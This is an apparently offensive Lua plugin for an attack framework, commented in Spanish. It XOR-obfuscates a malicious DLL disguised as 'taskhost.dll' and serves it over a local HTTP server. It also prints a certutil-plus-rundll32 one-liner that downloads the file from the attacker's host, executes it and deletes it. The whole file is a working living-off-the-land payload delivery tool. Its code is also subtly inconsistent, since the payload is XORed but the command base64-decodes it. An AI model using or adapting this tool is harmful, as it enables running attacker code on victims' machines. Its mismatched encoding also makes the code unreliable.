--plugins/lolbas_certutil_download_exec.lua
-- Plugin: lolbas_certutil_download_exec - Descarga y ejecuta DLL con certutil + rundll32
-- Uso: set lhost 192.168.1.10; lolbas_certutil_download_exec

local function write_file(path, content)
    local file = io.open(path, "wb")
    if not file then return nil, "cannot write " .. path end
    file:write(content)
    file:close()
    return true
end

local function read_file(path)
    local file = io.open(path, "rb")
    if not file then return nil, "cannot read " .. path end
    local content = file:read("*all")
    file:close()
    return content
end

local function xor_data(data, key)
    local result = {}
    for i = 1, #data do
        table.insert(result, string.byte(data:sub(i,i)) ~ key)
    end
    return string.char(table.unpack(result))
end

register_command("lolbas_certutil_download_exec", function()
    local lhost = app.params["lhost"]
    local xor_key = tonumber("0x33", 16) or 0x33
    local dll_name = "taskhost.dll"
    local output_path = "sessions/" .. dll_name
    local encoded_path = "sessions/" .. dll_name .. ".enc"
    local remote_url = "http://" .. lhost .. "/" .. dll_name .. ".enc"
    local local_dll = read_file("payloads/malicious.dll")

    if not lhost then
        return "Error: lhost not defined. Use 'set lhost x.x.x.x'"
    end

    if not local_dll then
        return "Error: payloads/malicious.dll not found"
    end

    -- Ofuscar DLL con XOR
    print("[*] XORing payload with key 0x33...")
    local xored_dll = xor_data(local_dll, xor_key)
    write_file(encoded_path, xored_dll)
    print("[+] Payload saved: " .. encoded_path)

    -- Generar one-liner
    local cmd = string.format(
        'certutil -urlcache -split -f %s %s && certutil -decode %s temp.dll && rundll32.exe temp.dll,EntryPoint && del temp.dll',
        remote_url,
        dll_name .. ".enc",
        dll_name .. ".enc"
    )

    -- Ofuscar comando
    app.one_cmd("encodewinbase64 " .. cmd)

    -- Iniciar servidor
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")
    print("\n[+] HTTP Server: http://" .. lhost .. ":80")
    print("    → /" .. dll_name .. ".enc")

    print("\n[🔥] One-liner (certutil + rundll32):")
    print("\n" .. cmd .. "\n")

    return "✅ lolbas_certutil_download_exec ready."
end)